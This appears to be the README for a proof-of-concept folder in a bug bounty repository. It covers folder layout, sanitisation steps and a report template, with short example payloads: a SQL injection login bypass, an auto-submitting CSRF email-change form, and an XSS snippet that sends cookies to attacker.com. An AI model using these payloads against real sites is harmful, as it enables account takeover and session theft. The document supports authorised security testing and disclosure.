# Proof of Concept (PoC) Directory

Store exploit code, scripts, and proof of concepts here.

## Organization

Organize PoCs by report ID or vulnerability type:

```
poc/
├── INTG-2025-12-30-001/
│   ├── exploit.py
│   ├── payload.html
│   └── README.md
├── H1-2025-12-30-002/
│   ├── xss_payload.js
│   └── csrf.html
└── scripts/
    ├── subdomain_enum.sh
    └── fuzzing_script.py
```

## File Types

### Exploit Scripts
```python
# exploit.py
# PoC for vulnerability ID: INTG-2025-12-30-001
# Description: SQL injection in login form

import requests

url = "https://target.com/login"
payload = "' OR '1'='1' --"

response = requests.post(url, data={"username": payload, "password": "test"})
print(response.text)
```

### HTML PoCs
```html
<!-- csrf.html -->
<!-- PoC for CSRF vulnerability -->
<html>
  <body>
    <form action="https://target.com/change-email" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com"/>
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

### JavaScript Payloads
```javascript
// xss_payload.js
// PoC for stored XSS

<script>
  fetch('https://attacker.com?cookie=' + document.cookie);
</script>
```

## Sanitization

⚠️ **Before committing:**

1. **Remove real targets**
   ```javascript
   // ❌ Don't commit
   const target = "https://real-company.com";

   // ✅ Do commit
   const target = "https://target.com"; // Replace with actual target
   ```

2. **Sanitize credentials**
   ```python
   # ❌ Don't commit
   api_key = "sk_live_abc123xyz789"

   # ✅ Do commit
   api_key = "YOUR_API_KEY_HERE"
   ```

3. **Add disclaimers**
   ```python
   """
   DISCLAIMER: This PoC is for educational purposes only.
   Only use on authorized targets with proper permission.
   """
   ```

## PoC Template

Create a README for each PoC:

```markdown
# PoC: [Vulnerability Name]

**Report ID**: INTG-2025-12-30-001
**Vulnerability**: SQL Injection
**Severity**: High
**Target**: [Company Name]
**Date**: 2025-12-30

## Description
Brief description of the vulnerability

## Usage
```bash
python exploit.py https://target.com/vulnerable-endpoint
```

## Requirements
- Python 3.x
- requests library

## Disclaimer
For authorized testing only.
```

## Best Practices

- Document each PoC
- Include usage instructions
- Sanitize all sensitive data
- Only commit after disclosure
- Use clear naming
- Add comments in code
- Test before committing

## Legal Notice

⚠️ **WARNING**: These PoCs are for:
- Authorized security testing
- Educational purposes
- Responsible disclosure
- Bug bounty programs

**NEVER** use on unauthorized targets!
